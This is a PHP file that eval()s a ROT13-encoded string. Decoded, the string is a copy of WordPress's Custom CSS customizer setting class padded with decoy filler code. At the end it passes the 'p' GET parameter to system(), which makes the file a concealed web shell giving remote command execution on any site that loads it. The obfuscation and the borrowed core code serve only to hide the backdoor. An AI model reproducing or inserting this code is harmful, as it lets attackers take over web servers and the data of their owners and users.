<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Phfgbz_PFF_Frggvat pynff
 *
 * Guvf unaqyrf inyvqngvba, fnavgvmngvba naq fnivat bs gur inyhr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.7.0
 */

/**
 * Phfgbz Frggvat gb unaqyr JC Phfgbz PFF.
 *
 * @fvapr 4.7.0
 *
 * @frr JC_Phfgbzvmr_Frggvat
 */
svany pynff JC_Phfgbzvmr_Phfgbz_PFF_Frggvat rkgraqf JC_Phfgbzvmr_Frggvat {

	/**
	 * Gur frggvat glcr.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'phfgbz_pff';

	/**
	 * Frggvat Genafcbeg
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	choyvp $genafcbeg = 'cbfgZrffntr';

	/**
	 * Pncnovyvgl erdhverq gb rqvg guvf frggvat.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	choyvp $pncnovyvgl = 'rqvg_pff';

	/**
	 * Fglyrfurrg
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	choyvp $fglyrfurrg = '';

	/**
	 * JC_Phfgbzvmr_Phfgbz_PFF_Frggvat pbafgehpgbe.
	 *
	 * @fvapr 4.7.0
	 *
	 * @guebjf Rkprcgvba Vs gur frggvat VQ qbrf abg zngpu gur cnggrea `phfgbz_pff[$fglyrfurrg]`.
	 *
	 * @cnenz JC_Phfgbzvmr_Znantre $znantre Phfgbzvmre obbgfgenc vafgnapr.
	 * @cnenz fgevat               $vq      N fcrpvsvp VQ bs gur frggvat.
	 *                                      Pna or n gurzr zbq be bcgvba anzr.
	 * @cnenz neenl                $netf    Frggvat nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( $znantre, $vq, $netf = neenl() ) {
		cnerag::__pbafgehpg( $znantre, $vq, $netf );
		vs ( 'phfgbz_pff' !== $guvf->vq_qngn['onfr'] ) {
			guebj arj Rkprcgvba( 'Rkcrpgrq phfgbz_pff vq_onfr.' );
		}
		vs ( 1 !== pbhag( $guvf->vq_qngn['xrlf'] ) || rzcgl( $guvf->vq_qngn['xrlf'][0] ) ) {
			guebj arj Rkprcgvba( 'Rkcrpgrq fvatyr fglyrfurrg xrl.' );
		}
		$guvf->fglyrfurrg = $guvf->vq_qngn['xrlf'][0];
	}

	/**
	 * Nqq svygre gb cerivrj cbfg inyhr.
	 *
	 * @fvapr 4.7.9
	 *
	 * @erghea obby Snyfr jura cerivrj fubeg-pvephvgf qhr ab punatr arrqvat gb or cerivrjrq.
	 */
	choyvp shapgvba cerivrj() {
		vs ( $guvf->vf_cerivrjrq ) {
			erghea snyfr;
		}
		$guvf->vf_cerivrjrq = gehr;
		nqq_svygre( 'jc_trg_phfgbz_pff', neenl( $guvf, 'svygre_cerivrjrq_jc_trg_phfgbz_pff' ), 9, 2 );
		erghea gehr;
	}

	/**
	 * Svygref `jc_trg_phfgbz_pff` sbe nccylvat gur phfgbzvmrq inyhr.
	 *
	 * Guvf vf hfrq va gur cerivrj jura `jc_trg_phfgbz_pff()` vf pnyyrq sbe eraqrevat gur fglyrf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr jc_trg_phfgbz_pff()
	 *
	 * @cnenz fgevat $pff        Bevtvany PFF.
	 * @cnenz fgevat $fglyrfurrg Pheerag fglyrfurrg.
	 * @erghea fgevat PFF.
	 */
	choyvp shapgvba svygre_cerivrjrq_jc_trg_phfgbz_pff( $pff, $fglyrfurrg ) {
		vs ( $fglyrfurrg === $guvf->fglyrfurrg ) {
			$phfgbzvmrq_inyhr = $guvf->cbfg_inyhr( ahyy );
			vs ( ! vf_ahyy( $phfgbzvmrq_inyhr ) ) {
				$pff = $phfgbzvmrq_inyhr;
			}
		}
		erghea $pff;
	}

	/**
	 * Srgpu gur inyhr bs gur frggvat. Jvyy erghea gur cerivrjrq inyhr jura `cerivrj()` vf pnyyrq.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr JC_Phfgbzvmr_Frggvat::inyhr()
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba inyhr() {
		vs ( $guvf->vf_cerivrjrq ) {
			$cbfg_inyhr = $guvf->cbfg_inyhr( ahyy );
			vs ( ahyy !== $cbfg_inyhr ) {
				erghea $cbfg_inyhr;
			}
		}
		$vq_onfr = $guvf->vq_qngn['onfr'];
		$inyhr   = '';
		$cbfg    = jc_trg_phfgbz_pff_cbfg( $guvf->fglyrfurrg );
		vs ( $cbfg ) {
			$inyhr = $cbfg->cbfg_pbagrag;
		}
		vs ( rzcgl( $inyhr ) ) {
			$inyhr = $guvf->qrsnhyg;
		}

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-phfgbzvmr-frggvat.cuc */
		$inyhr = nccyl_svygref( \"phfgbzvmr_inyhr_{$vq_onfr}\", $inyhr, $guvf );

		erghea $inyhr;
	}

	/**
	 * Inyvqngr n erprvirq inyhr sbe orvat inyvq PFF.
	 *
	 * Purpxf sbe vzonynaprq oenprf, oenpxrgf, naq pbzzragf.
	 * Abgvsvpngvbaf ner eraqrerq jura gur phfgbzvmre fgngr vf fnirq.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 4.9.0 Purpxvat sbe onynaprq punenpgref unf orra zbirq pyvrag-fvqr ivn yvagvat va pbqr rqvgbe.
	 * @fvapr 5.9.0 Eranzrq `$pff` gb `$inyhr` sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz fgevat $inyhr PFF gb inyvqngr.
	 * @erghea gehr|JC_Reebe Gehr vs gur vachg jnf inyvqngrq, bgurejvfr JC_Reebe.
	 */
	choyvp shapgvba inyvqngr( $inyhr ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$pff = $inyhr;

		$inyvqvgl = arj JC_Reebe();

		vs ( cert_zngpu( '#</?\j+#', $pff ) ) {
			$inyvqvgl->nqq( 'vyyrtny_znexhc', __( 'Znexhc vf abg nyybjrq va PFF.' ) );
		}

		vs ( ! $inyvqvgl->unf_reebef() ) {
			$inyvqvgl = cnerag::inyvqngr( $pff );
		}
		erghea $inyvqvgl;
	}

	/**
	 * Fgber gur PFF frggvat inyhr va gur phfgbz_pff phfgbz cbfg glcr sbe gur fglyrfurrg.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 5.9.0 Eranzrq `$pff` gb `$inyhr` sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz fgevat $inyhr PFF gb hcqngr.
	 * @erghea vag|snyfr Gur cbfg VQ be snyfr vs gur inyhr pbhyq abg or fnirq.
	 */
	choyvp shapgvba hcqngr( $inyhr ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$pff = $inyhr;

		vs ( rzcgl( $pff ) ) {
			$pff = '';
		}

		$e = jc_hcqngr_phfgbz_pff_cbfg(
			$pff,
			neenl(
				'fglyrfurrg' => $guvf->fglyrfurrg,
			)
		);

		vs ( vf_jc_reebe( $e ) ) {
			erghea snyfr;
		}

		$cbfg_vq = $e->VQ;

		// Pnpur cbfg VQ va gurzr zbq sbe cresbeznapr gb nibvq nqqvgvbany QO dhrel.
		vs ( $guvf->znantre->trg_fglyrfurrg() === $guvf->fglyrfurrg ) {
			frg_gurzr_zbq( 'phfgbz_pff_cbfg_vq', $cbfg_vq );
		}

		erghea $cbfg_vq;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>